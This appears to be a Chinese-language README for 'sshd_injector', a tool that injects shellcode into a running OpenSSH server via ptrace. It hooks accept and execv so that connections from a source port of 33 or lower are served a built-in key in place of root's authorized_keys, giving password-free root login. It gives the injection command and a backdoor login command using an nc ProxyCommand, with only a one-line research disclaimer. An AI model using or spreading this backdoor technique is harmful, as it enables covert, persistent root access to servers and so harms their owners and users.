# sshd_injector

---

## 项目简介

**sshd_injector** 是一个用于向系统 `sshd`（OpenSSH 服务器）进程注入后门的工具。它利用 Linux 的 `ptrace` 技术，将自定义代码钩子写入正在运行的 sshd 进程，从而实现无需密码即可 root 登录的隐藏后门。

---

## 实现原理

- 通过 `ptrace` 附加到目标 `sshd` 进程。
- 在 `sshd-master` 进程中寻找合适的空闲可执行内存，并注入自定义 shellcode。  
- 替换 GOT（全局偏移表）中的 `accept` 和 `execv` 函数指针为自定义钩子逻辑：
  - **accept 钩子**：检测 SSH 连接的端口号，若端口 ≤ 33，则设置后门标志位，触发后门流程。
  - **execv 钩子**：在后门标志激活时，对 `sshd` 的子进程（即 ssh session）执行 `ptrace`，当检测到对 `/root/.ssh/authorized_keys` 的读取操作时，将其内容替换为内置 SSH 公钥（如 `ssh-ed25519 ... root`）。
- 利用上述机制，可通过特定端口和后门密钥无条件获取 root 权限。

---

## 使用方法

### 1. 编译 injector

```bash
make
```
最终injector为静态编译，我已经将需要用到的lib放在/libs目录下

---

### 2. 注入 sshd

```bash
./build/injector $(pgrep sshd)
```

如果使用时 sshd 路径或相关依赖库路径不同，也可以在命令后跟参数指定：
```bash
./build/injector <sshd-master-pid> [sshd-path libc-path libcrypto-path ld-path]
```
默认路径如下：
- sshd: `/usr/bin/sshd`
- libc: `/usr/lib/libc.so.6`
- libcrypto: `/usr/lib/libcrypto.so.3`
- ld: `/usr/lib/ld-linux-x86-64.so.2`

---

### 3. 后门 SSH 登录

- 使用项目生成的 `./the_backdoor_key` 作为 SSH 私钥。
- 以及**端口号需小于等于 33**，如：`ssh -i the_backdoor_key -o "ProxyCommand = sudo nc 127.0.0.1 22 -p 111" root@127.0.0.1`
- 即可无条件获得 root 登录权限。

---

## 注意事项

> ⚠️ **警告：本项目仅供安全研究、学习与测试用途。请勿在未授权环境下使用，否则后果自负。**

---


## 联系与反馈

如有建议或需求，欢迎 issue 或 PR 交流。
